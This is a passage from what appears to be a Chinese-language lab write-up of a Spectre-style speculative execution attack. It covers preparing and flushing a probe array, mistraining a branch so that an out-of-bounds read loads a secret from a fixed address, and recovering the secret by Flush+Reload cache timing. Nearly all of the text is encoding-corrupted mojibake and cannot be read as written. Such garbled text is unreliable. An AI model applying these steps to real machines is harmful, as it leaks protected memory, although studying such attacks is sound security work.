3.  **å‡†å¤‡ä¾§ä¿¡é“**: å’Œå…¶ä»–æ”»å‡»ä¸€æ ·ï¼Œæˆ‘éœ€è¦å‡†å¤‡ä¸€ä¸ª `256 * 4096` çš„æ¢æµ‹æ•°ç»„ï¼Œå¹¶åœ¨æ”»å‡»å‰å°†å…¶ä»ç¼“å­˜ä¸­å®Œå…¨åˆ·æ–° (`Flush`)ã€‚

4.  **å‘èµ·æ”»å‡»**:
    -   ä¸ºäº†å¢åŠ æˆåŠŸç‡ï¼Œæˆ‘ä¼šå…ˆåˆ·æ–° `low` å’Œ `high` å˜é‡çš„ç¼“å­˜ï¼Œè¿™ä¼šæ‹–æ…¢ `if` æ¡ä»¶çš„åˆ¤æ–­é€Ÿåº¦ï¼Œä¸ºæ¨æµ‹æ‰§è¡Œäº‰å–æ—¶é—´ã€‚
    -   ç„¶åï¼Œæˆ‘è°ƒç”¨ `restrictedAccess(x)`ï¼Œå…¶ä¸­ `x` æ˜¯æˆ‘åœ¨ç¬¬ä¸€æ­¥è®¡ç®—å‡ºçš„æ¶æ„è´Ÿæ•°ç´¢å¼•ã€‚
    -   ç”±äºåˆ†æ”¯é¢„æµ‹å™¨çš„è®­ç»ƒï¼ŒCPUä¼šæ¨æµ‹ `if` æ¡ä»¶ä¸ºçœŸï¼Œå¹¶æå‰æ‰§è¡Œ `return buffer[x]`ã€‚è¿™ä¸ªæ“ä½œä¼šä» `0xbfff0100` åœ°å€åŠ è½½ç§˜å¯†æ•°å­—ï¼ˆå‡è®¾ä¸ºSï¼‰ã€‚
    -   ç´§æ¥ç€ï¼Œæˆ‘ç«‹å³åœ¨ä»£ç ä¸­ä½¿ç”¨è¿™ä¸ªæ¨æµ‹æ€§è¿”å›çš„ç»“æœSæ¥è®¿é—®æˆ‘çš„æ¢æµ‹æ•°ç»„ï¼š`probe_array[S * 4096] += 1;`ã€‚è¿™å°†ç§˜å¯†å€¼Sç¼–ç åˆ°äº†CPUç¼“å­˜ä¸­ã€‚

5.  **æ¢å¤ç§˜å¯†**: å½“CPUæœ€ç»ˆå®Œæˆ `if` æ¡ä»¶çš„è®¡ç®—ï¼Œå‘ç°é¢„æµ‹é”™è¯¯ï¼Œå®ƒä¼šå›æ»šçŠ¶æ€ã€‚ä½†ç¼“å­˜ä¸­çš„ç—•è¿¹å·²ç»ç•™ä¸‹ã€‚æˆ‘çš„ç¨‹åºä¼šç»§ç»­æ‰§è¡Œï¼Œæ­¤æ—¶æˆ‘é€šè¿‡éå†æ¢æµ‹æ•°ç»„å¹¶æµ‹é‡è®¿é—®æ—¶é—´ (`Reload`)ï¼Œæ‰¾åˆ°é‚£ä¸ªè®¿é—®æ—¶é—´æœ€çŸ­çš„ç´¢å¼•ï¼Œè¿™ä¸ªç´¢å¼•å°±æ˜¯æˆ‘çªƒå–åˆ°çš„ç§˜å¯†æ•°å­—Sã€‚